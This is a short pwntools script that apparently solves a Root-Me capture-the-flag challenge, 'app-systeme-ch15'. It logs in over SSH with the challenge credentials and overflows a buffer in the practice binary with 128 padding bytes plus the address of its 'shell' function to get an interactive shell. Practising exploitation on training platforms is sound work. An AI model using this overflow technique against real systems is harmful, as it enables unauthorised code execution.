import os
from pwn import *

# SSH connection details
ssh_host = 'challenge02.root-me.org'
ssh_port = 2222
ssh_user = 'app-systeme-ch15'
ssh_password = 'app-systeme-ch15'  # Replace this with the correct password if required

# Connect via SSH
s = ssh(host=ssh_host, port=ssh_port, user=ssh_user, password=ssh_password)
channel = s.run('pwd')
pwd_output = channel.recv().decode().strip()
elf_file_path = os.path.join(pwd_output, "ch15")

print(f"path to binary : {elf_file_path}")
# # Now let's load the ELF object locally
# elf = ELF(s.download(elf_file_path, local="ch15.c"))
elf = ELF('./ch15')

shell_addr = elf.symbols['shell']
print(f"addr for shell function is : {hex(shell_addr)}")
# for symb in elf.symbols:
#     print(f"{symb}: {hex(elf.symbols[symb])}")

p = s.process(elf_file_path)  # Start the binary

# Receive any initial output if there is any, to allow us to explore the program's behavior
# (Modify this as necessary if the program expects a prompt before you send input)
# initial_output = p.recv(1024)
# print(f"Initial output from ./ch13: {initial_output.decode()}")

# b'\xef\xbe\xad\xde' or p32(0xdeadbeef)
payload = b'a' * 128 + p32(shell_addr)   
print(f"{payload}")
p.sendline(payload)  # Send input to the binary
p.interactive()
# print(f"Output after sending buffer: {result.decode()}")

# Close the SSH connection
s.close()